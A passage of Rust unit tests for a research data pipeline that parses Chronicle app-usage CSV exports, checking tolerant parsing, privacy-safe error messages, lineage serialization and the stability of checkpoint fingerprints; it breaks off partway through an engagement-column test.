    fn apps_forcing_and_background_files_accept_both_column_spellings_and_skip_comments() {
        let forcing = parse_apps_forcing_csv(
            concat!(
                "package_name,label_or_note\n",
                "com.example.video, Video \n",
                "#com.example.commented,Ignored\n",
                ",Orphan\n",
            )
            .as_bytes(),
        );
        assert_eq!(
            forcing,
            HashMap::from([("com.example.video".to_string(), "Video".to_string())]),
        );
        // The alternate spelling of both columns is accepted.
        assert_eq!(
            parse_apps_forcing_csv(
                b"app_package_name,application_label\ncom.example.video,Video\n"
            ),
            forcing,
        );

        let background = parse_background_apps_csv(
            concat!(
                "app_package_name\n",
                " com.example.sync \n",
                "#com.example.commented\n",
                "\n",
            )
            .as_bytes(),
        );
        assert_eq!(
            background,
            AHashSet::from_iter(["com.example.sync".to_string()]),
        );
        assert_eq!(
            parse_background_apps_csv(b"package_name\ncom.example.sync\n"),
            background,
        );
    }

    #[test]
    fn codebook_parsing_keeps_the_first_row_per_package_and_drops_blank_cells() {
        let parsed = parse_codebook_csv(
            concat!(
                "app_package_name,bcm_play_store_broad_app_category\n",
                "com.example.chat,Social\n",
                "com.example.chat,Games\n",
                ",Orphan\n",
                "com.example.blank, \n",
            )
            .as_bytes(),
        );
        assert_eq!(parsed.len(), 2, "blank packages never become codebook keys");
        let category = CODEBOOK_RENAME_PAIRS
            .iter()
            .position(|(source, _)| *source == "bcm_play_store_broad_app_category")
            .expect("the broad category column is a declared codebook field");
        assert_eq!(
            parsed["com.example.chat"].fields[category].as_deref(),
            Some("Social"),
            "the first codebook row for a package wins",
        );
        assert_eq!(
            parsed["com.example.blank"].fields[category], None,
            "a whitespace-only cell is absent, not an empty string",
        );
    }

    #[test]
    fn support_record_parsing_survives_long_cells_and_ragged_rows() {
        // A support cell longer than the reader's initial 1 KiB field buffer
        // must round trip: the reader grows the buffer instead of truncating a
        // researcher's label.
        let long_label = "L".repeat(5_000);
        let csv =
            format!("app_package_name,known_application_labels\ncom.example.chat,{long_label}\n");
        for (preset, refused) in [
            (PackageExclusionPreset::AllSuppliedRows, false),
            (PackageExclusionPreset::HonorFilterFlag, false),
            (PackageExclusionPreset::SystemScopeOnly, true),
        ] {
            assert_eq!(
                validate_filter_file_for_preset(b"app_package_name\ncom.example.chat\n", preset)
                    .is_err(),
                refused,
                "{preset:?}"
            );
            validate_filter_file_for_preset(
                b"app_package_name,app_filter_category\ncom.example.chat,system\n",
                preset,
            )
            .expect("a file with the category column");
        }
        let parsed = parse_filter_csv(
            csv.as_bytes(),
            PackageExclusionPreset::AllSuppliedRows,
            FilterMatchField::AppPackageName,
        );
        assert_eq!(
            parsed.packages["com.example.chat"]
                .iter()
                .cloned()
                .collect::<Vec<_>>(),
            vec![long_label],
        );

        // The record parser grows the same buffer in both of its passes, so a
        // column name and a cell that each exceed it have to round trip too.
        let long_header = "H".repeat(5_000);
        let long_value = "V".repeat(5_000);
        let wide = format!("app_package_name,{long_header}\ncom.example.chat,{long_value}\n");
        let wide = parse_csv_to_records_with_physical_rows(wide.as_bytes());
        assert_eq!(wide.len(), 1);
        assert_eq!(wide[0].1[long_header.as_str()], long_value);
        assert_eq!(wide[0].1["app_package_name"], "com.example.chat");

        // Real exports contain records with more cells than the header
        // declares. The extra cells are dropped and the declared columns still
        // parse; indexing past the header would panic instead.
        let ragged = parse_csv_to_records_with_physical_rows(
            b"app_package_name,known_application_labels\ncom.example.chat,Chat,extra,cells\n",
        );
        assert_eq!(ragged.len(), 1);
        assert_eq!(ragged[0].0, 1);
        assert_eq!(ragged[0].1["app_package_name"], "com.example.chat");
        assert_eq!(ragged[0].1["known_application_labels"], "Chat");

        // Physical data-row numbers count every record, including the all-empty
        // ones this parser drops, so support-file errors name the row a
        // researcher sees in their spreadsheet. A bare blank line carries no
        // field and is not a record; a record whose cells are all empty is.
        let numbered = parse_csv_to_records_with_physical_rows(
            b"app_package_name,label\ncom.example.first,First\n,\ncom.example.third,Third\n",
        );
        assert_eq!(
            numbered
                .iter()
                .map(|(row, record)| (*row, record["app_package_name"].clone()))
                .collect::<Vec<_>>(),
            vec![
                (1, "com.example.first".to_string()),
                (3, "com.example.third".to_string()),
            ],
        );
    }

    /// The raw Chronicle export goes through its own reader, and the same
    /// buffer-growth, ragged-row and degenerate-input cases apply there. A
    /// truncated `application_label` here would silently rename an app in every
    /// output file.
    #[test]
    fn supplied_sms_links_use_physical_artifact_rows_without_time_inference() {
        let header = "participant_id,communication_modality,communication_direction,communication_peer_id,sms_response_to_source_row,communication_conversation_id,event_timestamp\n";
        let valid = format!("{header}P,sms,received,peer,,conversation,opaque-later\n,,,,,,\nP,sms,sent,peer,1,conversation,opaque-earlier\n");
        assert!(validate_supplied_communication_relationships(valid.as_bytes()).is_ok());
        let unknown_peer = valid.replace("sent,peer,1", "sent,,1");
        assert!(validate_supplied_communication_relationships(unknown_peer.as_bytes()).is_ok());
        let other_person_same_token =
            format!("{valid}Other,sms,received,other-peer,,conversation,unknown\n");
        assert!(
            validate_supplied_communication_relationships(other_person_same_token.as_bytes())
                .is_ok()
        );
        for invalid in [
            valid.replace("sent,peer,1", "sent,peer,2"), // all-empty physical row
            valid.replace("sent,peer,1", "sent,peer,3"), // self
            valid.replace("sent,peer,1", "sent,peer,9"), // absent
            valid.replace("sent,peer,1", "sent,peer,1.0"),
            valid.replace("sent,peer,1", "sent,peer,-1"),
            valid.replace("sent,peer,1", "received,peer,1"),
            valid.replace("P,sms,received", "Other,sms,received"),
            valid.replace("P,sms,received", "P,call,received"),
            valid.replace("P,sms,received", "P,sms,sent"),
            valid.replace("sent,peer,1", "sent,other-peer,1"),
            valid.replace(
                "sent,peer,1,conversation",
                "sent,peer,1,another-conversation",
            ),
            format!("{valid}P,sms,received,other-peer,,conversation,unknown\n"),
        ] {
            assert!(validate_supplied_communication_relationships(invalid.as_bytes()).is_err());
        }
    }

    #[test]
    fn raw_export_parsing_survives_long_cells_ragged_rows_and_empty_input() {
        let long_label = "L".repeat(5_000);
        let quoted_long_label = format!("Chat, {}", "Q".repeat(5_000));
        let csv = format!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n\
             Study,P01,Target Child,{long_label},Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n\
             Study,P01,Target Child,\"{quoted_long_label}\",Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let parsed = incremental::decode_source_records(csv.as_bytes());
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0].application_label, long_label);
        assert_eq!(parsed[1].application_label, quoted_long_label);
        assert_eq!(parsed[0].app_package_name, "com.example.chat");
        assert_eq!(parsed[1].interaction_type, "Activity Paused");

        // A header longer than the field buffer must survive too, or the
        // column it names becomes unfindable and every value in it is lost.
        let long_header = "h".repeat(3_000);
        let wide = format!(
            "{long_header},participant_id,event_timestamp\nignored,P01,2026-03-07 10:00:00\n"
        );
        let wide_parsed = incremental::decode_source_records(wide.as_bytes());
        assert_eq!(wide_parsed.len(), 1);
        assert_eq!(wide_parsed[0].participant_id, "P01");
        assert_eq!(wide_parsed[0].event_timestamp, "2026-03-07 10:00:00");

        // More cells than the header declares: the extras are dropped, the
        // declared columns still parse, and the row number keeps counting.
        let ragged = incremental::decode_source_records(
            b"participant_id,event_timestamp\nP01,2026-03-07 10:00:00,extra,cells\nP02,2026-03-07 10:05:00\n",
        );
        assert_eq!(
            ragged
                .iter()
                .map(|row| (row.source_data_row, row.participant_id.as_str()))
                .collect::<Vec<_>>(),
            vec![(1, "P01"), (2, "P02")]
        );

        // Degenerate inputs: no bytes at all, and a final record with no
        // trailing newline, which the reader has to terminate itself.
        assert!(incremental::decode_source_records(b"").is_empty());
        assert!(incremental::decode_source_records(b"participant_id,event_timestamp\n").is_empty());
        let unterminated = incremental::decode_source_records(
            b"participant_id,event_timestamp\nP01,2026-03-07 10:00:00",
        );
        assert_eq!(unterminated.len(), 1);
        assert_eq!(unterminated[0].participant_id, "P01");
        assert_eq!(unterminated[0].event_timestamp, "2026-03-07 10:00:00");

        // Headers are matched the way raw inspection matches them: a
        // byte-order mark and surrounding spaces must not hide a column.
        let excel = incremental::decode_source_records(
            "\u{feff}study_id, participant_id ,event_timestamp\nS1,P01,2026-03-07 10:00:00\n"
                .as_bytes(),
        );
        assert_eq!(excel.len(), 1);
        assert_eq!(excel[0].study_id, "S1");
        assert_eq!(excel[0].participant_id, "P01");
    }

    #[test]
    fn discovery_and_incremental_report_the_same_physical_data_row() {
        // Header + valid data row 1 + an all-empty filler record (physical
        // data row 2 — skipped by parse_csv_to_records_with_physical_rows'
        // any_nonempty guard and dropped by remove_missing_timestamps) + an invalid
        // event_timestamp at physical data row 3. Both reporting paths must
        // name physical data row 3; the old discovery numbering (enumerate()
        // over the skipping parser) said data row 2.
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
            ",,,,,,,\n",
            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,not-a-timestamp,UTC\n",
        );

        let discovery_error = discover_timezones_v2_native(csv.as_bytes())
            .expect_err("invalid event_timestamp must fail discovery");
        assert_eq!(discovery_error, "Invalid event_timestamp at data row 3");

        let raw = incremental::decode_source_records(csv.as_bytes());
        let raw = incremental::remove_missing_timestamps(raw);
        let model = incremental::attach_device_models(&raw);
        let processing_error =
            incremental::canonicalize_source_rows(&raw, "UTC", &BTreeMap::new(), &model)
                .err()
                .expect("invalid event_timestamp must fail processing");
        assert_eq!(processing_error, discovery_error);

        // PHI safety: the raw cell value must not appear in either error.
        assert!(!discovery_error.contains("not-a-timestamp"));
        assert!(!processing_error.contains("not-a-timestamp"));
    }

    #[test]
    fn screen_witness_state_error_omits_raw_interaction_type() {
        let error = screen_witness_state("Unknown importance: com.example.secret")
            .expect_err("unmapped interaction type must fail");
        assert!(
            !error.contains("com.example.secret"),
            "raw cell value leaked into the error: {error}"
        );
        assert!(error.contains("unmapped interaction type"), "{error}");
    }

    #[test]
    fn cached_row_layout_is_bounded() {
        let bytes = std::mem::size_of::<Row>();
        assert!(bytes <= 16, "cached Row layout regressed to {bytes} bytes");
    }

    #[test]
    fn persisted_string_dictionary_round_trips_and_rejects_bad_references() {
        let values = vec![
            SharedString::from("participant-01"),
            SharedString::from("Activity Resumed"),
            SharedString::from("participant-01"),
        ];
        let encoded = with_serialized_row_string_table(|| postcard::to_allocvec(&values))
            .expect("encode dictionary strings");
        let decoded: Vec<SharedString> = with_deserialized_row_string_pool(|| {
            postcard::from_bytes(&encoded).expect("decode dictionary strings")
        });
        assert_eq!(decoded, values);
        assert!(Arc::ptr_eq(&decoded[0].0, &decoded[2].0));

        for invalid in [
            PersistedString { id: 0, value: None },
            PersistedString {
                id: 1,
                value: Some("out-of-order".into()),
            },
        ] {
            let encoded = postcard::to_allocvec(&invalid).expect("encode invalid token");
            assert!(with_deserialized_row_string_pool(|| {
                postcard::from_bytes::<SharedString>(&encoded)
            })
            .is_err());
        }

        assert!(postcard::to_allocvec(&SharedString::from("unscoped")).is_err());
    }

    /// JSON text reaches serde through three different entry points depending
    /// on how the document arrives: an in-memory document borrows its bytes, a
    /// streamed one is copied through a scratch buffer, and a pre-parsed value
    /// hands over an owned `String`. All three have to produce the same text.
    /// Interning is what keeps a long run's memory flat, so the sharing rules
    /// are checked too: repeated values inside one row table share a single
    /// allocation, the fixed lineage vocabulary reuses one process-wide
    /// allocation across tables, and anything else stays private.
    #[test]
    fn json_strings_decode_the_same_text_through_every_serde_entry_point() {
        #[derive(Debug, serde::Deserialize)]
        struct SharedField {
            text: SharedString,
        }

        #[derive(Debug, serde::Deserialize)]
        struct ArcField {
            #[serde(deserialize_with = "deserialize_shared_arc_string")]
            text: Arc<String>,
        }

        fn document(text: &str) -> String {
            format!(r#"{{"text":"{text}"}}"#)
        }

        let borrowed = document("selected-qualifying-stop");
        let owned = serde_json::json!({ "text": "selected-qualifying-stop" });

        for text in [
            serde_json::from_str::<SharedField>(&borrowed)
                .expect("borrowed shared string")
                .text,
            serde_json::from_reader::<_, SharedField>(borrowed.as_bytes())
                .expect("copied shared string")
                .text,
            serde_json::from_value::<SharedField>(owned.clone())
                .expect("owned shared string")
                .text,
        ] {
            assert_eq!(text.as_str(), "selected-qualifying-stop");
        }

        for text in [
            serde_json::from_str::<ArcField>(&borrowed)
                .expect("borrowed lineage string")
                .text,
            serde_json::from_reader::<_, ArcField>(borrowed.as_bytes())
                .expect("copied lineage string")
                .text,
            serde_json::from_value::<ArcField>(owned)
                .expect("owned lineage string")
                .text,
        ] {
            assert_eq!(text.as_str(), "selected-qualifying-stop");
        }

        // Every lineage constant is a fixed vocabulary word, so two decodes
        // outside any row table still hand back one allocation.
        for text in [
            "chronicle-lineage-search/v1",
            "selected-qualifying-stop",
            "no-qualifying-stop",
            "screen-credit-liveness-window",
            "pipeline-event-order",
            "participant-source-event-order",
        ] {
            let document = document(text);
            let first = serde_json::from_str::<ArcField>(&document)
                .expect("first lineage decode")
                .text;
            let second = serde_json::from_str::<ArcField>(&document)
                .expect("second lineage decode")
                .text;
            assert_eq!(first.as_str(), text);
            assert_eq!(second.as_str(), text);
            assert!(
                Arc::ptr_eq(&first, &second),
                "lineage constant {text} allocated a private copy"
            );
        }

        // A raw-data value is not part of that vocabulary and must not be
        // retained process-wide once its row table is gone.
        let package = document("com.example.app");
        let loose_first = serde_json::from_str::<ArcField>(&package)
            .expect("first package decode")
            .text;
        let loose_second = serde_json::from_str::<ArcField>(&package)
            .expect("second package decode")
            .text;
        assert!(!Arc::ptr_eq(&loose_first, &loose_second));

        // Within one row table both entry points intern, so a package name
        // repeated across rows costs one allocation.
        let pooled: Vec<SharedString> = with_deserialized_row_string_pool(|| {
            vec![
                serde_json::from_str::<SharedField>(&package)
                    .expect("pooled borrowed")
                    .text,
                serde_json::from_str::<SharedField>(&package)
                    .expect("pooled borrowed again")
                    .text,
                serde_json::from_value::<SharedField>(
                    serde_json::json!({ "text": "com.example.app" }),
                )
                .expect("pooled owned")
                .text,
            ]
        });
        for value in &pooled {
            assert_eq!(value.as_str(), "com.example.app");
        }
        assert!(Arc::ptr_eq(&pooled[0].0, &pooled[1].0));
        assert!(Arc::ptr_eq(&pooled[1].0, &pooled[2].0));

        // A corrupt persisted row names what it wanted instead of the value it
        // rejected, so the message can be shown without leaking raw data.
        for error in [
            serde_json::from_str::<SharedField>(r#"{"text":5}"#)
                .expect_err("a number is not a shared string")
                .to_string(),
            serde_json::from_str::<ArcField>(r#"{"text":5}"#)
                .expect_err("a number is not a lineage string")
                .to_string(),
        ] {
            assert!(error.contains("a UTF-8 string"), "{error}");
        }
    }

    /// The payload store codes lineage with postcard through the stored
    /// mirror. Every optional field, present or absent, and every search must
    /// come back equal, and repeated strings must come back shared.
    #[test]
    fn stored_row_lineage_round_trips_every_field() {
        let digest = LineageSearchDigest::parse(
            "blake3:000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f",
        )
        .expect("parse a blake3 digest");
        let output_kind = Arc::new("screen-csv".to_owned());
        let terminal_query_group = Arc::new("outputs".to_owned());
        let searched = PipelineRowLineage {
            output_kind: Arc::clone(&output_kind),
            output_row_index: 0,
            source_data_row_ranges: vec![
                SourceDataRowRange { first: 3, last: 5 },
                SourceDataRowRange { first: 9, last: 9 },
            ],
            source_data_row_count: 4,
            searches: vec![LineageSearchEvidence {
                protocol_version: Arc::new("chronicle-lineage-search/v1".to_owned()),
                reason: Arc::new("selected-qualifying-stop".to_owned()),
                index_space: Arc::new("pipeline-event-order".to_owned()),
                start_participant_id: Arc::new("participant-7".to_owned()),
                start_event_index: 11,
                end_event_index_exclusive: 42,
                candidate_event_count: 3,
                candidate_chain_digest: digest,
            }],
            terminal_query_group: Arc::clone(&terminal_query_group),
            screen: Some(Box::new(ScreenIntervalLineage {
                screen_interval_id: Some("screen-interval-1".to_owned()),
                screen_construction_strategy_id: Some("strategy".to_owned()),
                screen_interval_kind: Some("kind".to_owned()),
                screen_interval_close_reason: Some("reason".to_owned()),
                screen_interval_left_censored: Some(true),
                screen_interval_right_censored: Some(false),
                schoedel_completion: Some("complete".to_owned()),
            })),
        };
        let bare = PipelineRowLineage {
            output_kind: Arc::clone(&output_kind),
            output_row_index: 1,
            source_data_row_ranges: Vec::new(),
            source_data_row_count: 0,
            searches: Vec::new(),
            terminal_query_group: Arc::clone(&terminal_query_group),
            screen: None,
        };
        let rows = vec![searched, bare];

        let bytes = with_serialized_row_string_table(|| encode_row_lineage_payload(&rows))
            .expect("encode lineage");
        let decoded = with_deserialized_row_string_pool(|| decode_row_lineage_payload(&bytes))
            .expect("decode lineage");

        assert_eq!(decoded, rows);
        assert_eq!(decoded.capacity(), rows.len());
        assert!(Arc::ptr_eq(&decoded[0].output_kind, &decoded[1].output_kind));
        assert!(Arc::ptr_eq(&decoded[0].terminal_query_group, &decoded[1].terminal_query_group));

        // The JSON wire is the seven optional members flattened into the row,
        // present only when set, and a row without them reads back boxless.
        let json = serde_json::to_string(&rows).expect("lineage JSON");
        assert!(
            json.contains(concat!(
                r#""terminalQueryGroup":"outputs","#,
                r#""screenIntervalId":"screen-interval-1","#,
                r#""screenConstructionStrategyId":"strategy","#,
                r#""screenIntervalKind":"kind","#,
                r#""screenIntervalCloseReason":"reason","#,
                r#""screenIntervalLeftCensored":true,"#,
                r#""screenIntervalRightCensored":false,"#,
                r#""schoedelCompletion":"complete"}"#,
            )),
            "{json}"
        );
        assert!(json.ends_with(r#""terminalQueryGroup":"outputs"}]"#), "{json}");
        let round_tripped: Vec<PipelineRowLineage> =
            serde_json::from_str(&json).expect("lineage from JSON");
        assert_eq!(round_tripped, rows);
        assert!(round_tripped[1].screen.is_none());
        // The JSON wire shape is untouched: absent optionals stay absent.
        let json = serde_json::to_string(&rows[1]).expect("json lineage");
        assert!(!json.contains("screenIntervalId"), "{json}");
    }

    /// The Arrow evidence export writes the raw 32 digest bytes while the
    /// human-readable views write `blake3:<hex>`. Both come off the same value,
    /// so they have to describe the same digest.
    #[test]
    fn lineage_search_digest_keeps_its_bytes_and_text_in_step() {
        const TEXT: &str =
            "blake3:000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f";
        let digest = LineageSearchDigest::parse(TEXT).expect("parse a blake3 digest");
        let expected: [u8; 32] = std::array::from_fn(|index| index as u8);
        assert_eq!(digest.as_bytes(), &expected);
        assert_eq!(digest.to_string(), TEXT);
    }

    /// A persisted row carries three hand-written codecs. Each has to name the
    /// shape it wants when a stored row is corrupt, and the codebook codec has
    /// to keep the exact field vector it was handed: the shared all-none vector
    /// is an allocation shortcut for the one length that is entirely empty,
    /// never a substitute for a row that carries real codebook values.
    #[test]
    fn row_payload_codecs_keep_their_values_and_name_what_they_expect() {
        #[derive(Debug, serde::Deserialize)]
        struct Codebook {
            #[serde(deserialize_with = "deserialize_codebook_fields")]
            fields: Arc<Vec<Option<String>>>,
        }

        #[derive(Debug, serde::Deserialize)]
        struct Searches {
            #[serde(deserialize_with = "deserialize_lineage_searches")]
            searches: Arc<SmallVec<[LineageSearchEvidence; 1]>>,
        }

        fn codebook(fields: &[Option<String>]) -> Arc<Vec<Option<String>>> {
            let encoded = serde_json::to_string(fields).expect("encode codebook fields");
            serde_json::from_str::<Codebook>(&format!(r#"{{"fields":{encoded}}}"#))
                .expect("decode codebook fields")
                .fields
        }

        let width = CODEBOOK_RENAME_PAIRS.len();
        let blank = vec![None; width];
        assert!(
            Arc::ptr_eq(&codebook(&blank), empty_codebook_fields_ref()),
            "a row with no codebook values shares the one empty vector",
        );

        let mut populated = blank.clone();
        populated[0] = Some("Social".to_string());
        assert_eq!(
            codebook(&populated).as_ref(),
            &populated,
            "a populated codebook field survives the round trip",
        );

        let short = vec![None; 2];
        assert_eq!(
            codebook(&short).as_ref(),
            &short,
            "a field vector of another length keeps its own length",
        );

        let empty_searches = |label: &str| {
            serde_json::from_str::<Searches>(r#"{"searches":[]}"#)
                .unwrap_or_else(|error| panic!("{label}: {error}"))
                .searches
        };
        assert!(
            Arc::ptr_eq(&empty_searches("first"), &empty_searches("second")),
            "a row with no lineage searches shares the one empty list",
        );

        for (document, wanted) in [
            (
                r#"{"fields":5}"#,
                "the fixed Chronicle codebook field sequence",
            ),
            (r#"{"searches":5}"#, "a sequence of lineage-search records"),
        ] {
            let error = if document.contains("fields") {
                serde_json::from_str::<Codebook>(document).unwrap_err()
            } else {
                serde_json::from_str::<Searches>(document).unwrap_err()
            };
            assert!(error.to_string().contains(wanted), "{error}");
        }
        let ranges = serde_json::from_str::<SourceDataRows>("5")
            .expect_err("a number is not a source-row range list");
        assert!(
            ranges
                .to_string()
                .contains("a sequence of source-data row ranges"),
            "{ranges}",
        );
    }

    /// The checkpoint fingerprint streams serde events into xxh3 through two
    /// internal buffers: a 4 KiB sink buffer and a 64-byte stack buffer for
    /// `Display` values. Where a payload happens to land in those buffers must
    /// not change the fingerprint, and no payload length may push either buffer
    /// past its end, so the sweep walks every length across both boundaries and
    /// checks that the same content always fingerprints the same way.
    ///
    /// A string tail always occupies at least nine bytes, so it can never start
    /// on the sink buffer's last free slot. A `u8` is the smallest write the
    /// sink accepts, and the sweep pairs one with every payload length so the
    /// single-byte landing on that last slot is covered too.
    #[test]
    fn the_checkpoint_fingerprint_follows_content_and_not_buffer_alignment() {
        let mut seen = std::collections::BTreeSet::new();
        for length in 0..=4200_usize {
            let text = "x".repeat(length);
            let owned = vec![text.clone(), "tail".to_owned()];
            let borrowed = vec![text.as_str(), "tail"];
            let fingerprint = value_fingerprint(&owned).expect("fingerprint an owned payload");
            assert_eq!(
                fingerprint,
                value_fingerprint(&borrowed).expect("fingerprint a borrowed payload"),
                "payload of {length} bytes fingerprinted differently when borrowed"
            );
            assert!(
                seen.insert(fingerprint),
                "payload of {length} bytes reused an earlier fingerprint"
            );

            let single_byte_tail = (text.as_str(), 7_u8);
            let tail_fingerprint =
                value_fingerprint(&single_byte_tail).expect("fingerprint a one-byte tail");
            assert_eq!(
                tail_fingerprint,
                value_fingerprint(&(text.clone(), 7_u8))
                    .expect("fingerprint an owned one-byte tail"),
                "payload of {length} bytes with a one-byte tail fingerprinted differently \
                 when borrowed"
            );
            assert!(
                seen.insert(tail_fingerprint),
                "payload of {length} bytes with a one-byte tail reused an earlier fingerprint"
            );
        }
    }

    /// Every serde shape the fingerprint accepts has to stay separable: two
    /// values that differ anywhere - in a number, a name, a variant index, or a
    /// payload - must not share a fingerprint, or a changed step value would be
    /// reported as unchanged. Values only reachable through `Display` take a
    /// different route into the sink and have to land on the same bytes as the
    /// string they print.
    #[test]
    fn the_checkpoint_fingerprint_separates_every_serde_shape_it_accepts() {
        enum Shape {
            Bool(bool),
            I8(i8),
            I16(i16),
            I32(i32),
            I64(i64),
            I128(i128),
            U8(u8),
            U16(u16),
            U32(u32),
            U64(u64),
            U128(u128),
            F32(f32),
            F64(f64),
            Char(char),
            Str(String),
            Bytes(Vec<u8>),
            Nothing,
            Something(i64),
            Unit,
            UnitStruct(&'static str),
            UnitVariant(&'static str, u32),
            NewtypeStruct(&'static str, i64),
            NewtypeVariant(&'static str, u32, i64),
            Printed(String, u32),
            Sequence(Vec<Shape>),
            Refusing,
        }

        struct Printer<'a>(&'a str, u32);

        impl std::fmt::Display for Printer<'_> {
            fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                for _ in 0..self.1 {
                    formatter.write_str(self.0)?;
                }
                Ok(())
            }
        }

        impl serde::Serialize for Shape {
            fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
            where
                S: serde::Serializer,
            {
                match self {
                    Shape::Bool(value) => serializer.serialize_bool(*value),
                    Shape::I8(value) => serializer.serialize_i8(*value),
                    Shape::I16(value) => serializer.serialize_i16(*value),
                    Shape::I32(value) => serializer.serialize_i32(*value),
                    Shape::I64(value) => serializer.serialize_i64(*value),
                    Shape::I128(value) => serializer.serialize_i128(*value),
                    Shape::U8(value) => serializer.serialize_u8(*value),
                    Shape::U16(value) => serializer.serialize_u16(*value),
                    Shape::U32(value) => serializer.serialize_u32(*value),
                    Shape::U64(value) => serializer.serialize_u64(*value),
                    Shape::U128(value) => serializer.serialize_u128(*value),
                    Shape::F32(value) => serializer.serialize_f32(*value),
                    Shape::F64(value) => serializer.serialize_f64(*value),
                    Shape::Char(value) => serializer.serialize_char(*value),
                    Shape::Str(value) => serializer.serialize_str(value),
                    Shape::Bytes(value) => serializer.serialize_bytes(value),
                    Shape::Nothing => serializer.serialize_none(),
                    Shape::Something(value) => serializer.serialize_some(value),
                    Shape::Unit => serializer.serialize_unit(),
                    Shape::UnitStruct(name) => serializer.serialize_unit_struct(name),
                    Shape::UnitVariant(name, index) => {
                        serializer.serialize_unit_variant(name, *index, "variant")
                    }
                    Shape::NewtypeStruct(name, value) => {
                        serializer.serialize_newtype_struct(name, value)
                    }
                    Shape::NewtypeVariant(name, index, value) => {
                        serializer.serialize_newtype_variant(name, *index, "variant", value)
                    }
                    Shape::Printed(text, repeats) => {
                        serializer.collect_str(&Printer(text, *repeats))
                    }
                    Shape::Sequence(values) => serializer.collect_seq(values),
                    Shape::Refusing => Err(serde::ser::Error::custom("probe refused to serialize")),
                }
            }
        }

        fn fingerprint(shape: &Shape) -> [u8; 16] {
            value_fingerprint(shape).expect("fingerprint a probe shape")
        }

        let shapes = [
            Shape::Bool(false),
            Shape::Bool(true),
            Shape::I8(0),
            Shape::I8(1),
            Shape::I16(0),
            Shape::I16(1),
            Shape::I32(0),
            Shape::I32(1),
            Shape::I64(0),
            Shape::I64(1),
            Shape::I128(0),
            Shape::I128(1),
            Shape::U8(0),
            Shape::U8(1),
            Shape::U16(0),
            Shape::U16(1),
            Shape::U32(0),
            Shape::U32(1),
            Shape::U64(0),
            Shape::U64(1),
            Shape::U128(0),
            Shape::U128(1),
            Shape::F32(0.0),
            Shape::F32(1.0),
            Shape::F64(0.0),
            Shape::F64(1.0),
            Shape::Char('a'),
            Shape::Char('b'),
            Shape::Str("a".to_owned()),
            Shape::Str("b".to_owned()),
            Shape::Bytes(vec![1]),
            Shape::Bytes(vec![2]),
            Shape::Nothing,
            Shape::Something(0),
            Shape::Something(1),
            Shape::Unit,
            Shape::UnitStruct("First"),
            Shape::UnitStruct("Second"),
            Shape::UnitVariant("First", 0),
            Shape::UnitVariant("First", 1),
            Shape::UnitVariant("Second", 0),
            Shape::NewtypeStruct("First", 0),
            Shape::NewtypeStruct("First", 1),
            Shape::NewtypeStruct("Second", 0),
            Shape::NewtypeVariant("First", 0, 0),
            Shape::NewtypeVariant("First", 0, 1),
            Shape::NewtypeVariant("First", 1, 0),
            Shape::NewtypeVariant("Second", 0, 0),
            // A unit inside a sequence is a value, not an absence: dropping it
            // must not make the sequence read as the shorter one.
            Shape::Sequence(vec![Shape::U8(1)]),
            Shape::Sequence(vec![Shape::Unit, Shape::U8(1)]),
            Shape::Sequence(vec![Shape::U8(1), Shape::Unit]),
        ];
        let mut seen = std::collections::BTreeSet::new();
        for (index, shape) in shapes.iter().enumerate() {
            assert!(
                seen.insert(fingerprint(shape)),
                "probe shape {index} reused an earlier fingerprint"
            );
        }

        // A `Display` value has to fingerprint as the string it prints, both
        // when it fits the stack buffer and when it spills to the heap.
        // The last two cases overflow the 64-byte stack buffer: once in many
        // small writes, once in a single write larger than the buffer itself.
        for (piece, repeats) in [
            ("ab", 3_u32),
            ("0123456789", 12),
            ("z", 0),
            (
                "0123456789012345678901234567890123456789012345678901234567890123456789",
                1,
            ),
        ] {
            let printed = Shape::Printed(piece.to_owned(), repeats);
            let written = Shape::Str(piece.repeat(repeats as usize));
            assert_eq!(
                fingerprint(&printed),
                fingerprint(&written),
                "{piece} repeated {repeats} times fingerprinted differently through Display"
            );
        }

        // A value that refuses to serialize names its own reason, so a failure
        // reaches the caller as something it can act on.
        let refused =
            value_fingerprint(&Shape::Refusing).expect_err("a refusing probe must not fingerprint");
        assert!(refused.contains("probe refused to serialize"), "{refused}");
    }

    /// The engagement columns describe how a session relates to the one before
    /// it: whether more than thirty seconds (or the study's own threshold)
    /// passed, whether the app changed, and how long the gap was in hours. The
    /// `valid_*` columns look back only at unfiltered sessions while the
    /// `any_*` columns look back at filtered ones too, so a filtered session in
    /// between has to move one pair and not the other.
    ///
    /// The walk also decides which cached row-checkpoint components to discard.
    /// Getting that wrong leaves a digest that describes values the row no
    /// longer holds, so every row is checked against a freshly hashed copy of
    /// its own data.
    #[test]
    fn engagement_columns_measure_the_gap_to_the_previous_session_of_each_kind() {
        const SECOND: i64 = 1_000_000_000;
        let custom_duration = 300.0;

        let sessions: &[(&str, &str, i64, i64)] = &[
            // (interaction, package, start seconds, stop seconds)
            (APP_USAGE, "com.example.chat", 0, 60),
            // Exactly thirty seconds later: the thirty-second flag is strict.
            (APP_USAGE, "com.example.chat", 90, 150),
            // Exactly the study threshold later, and a different app.
            (APP_USAGE, "com.example.video", 450, 500),
            // A filtered session moves the any_* baseline but not valid_*.
            (FILTERED_APP_USAGE, "com.example.secret", 531, 560),
            (APP_USAGE, "com.example.chat", 600, 660),
        ];
        // The event timestamps only have to be distinct and parseable; the walk
        // reads the session start and stop set below.
        let mut rows = rows_from_events(
            &sessions
                .iter()
                .enumerate()
                .map(|(index, (_, package, _, _))| {
                    (
                        [
                            "2026-03-07 10:00:00",
                            "2026-03-07 10:01:00",
                            "2026-03-07 10:02:00",
                            "2026-03-07 10:03:00",
                            "2026-03-07 10:04:00",
                        ][index],
                        "Activity Resumed",
                        *package,
                    )
                })
                .collect::<Vec<_>>(),
        );
        for (row, (interaction, _, start, stop)) in rows.iter_mut().zip(sessions) {
            let data = row.edit_all();
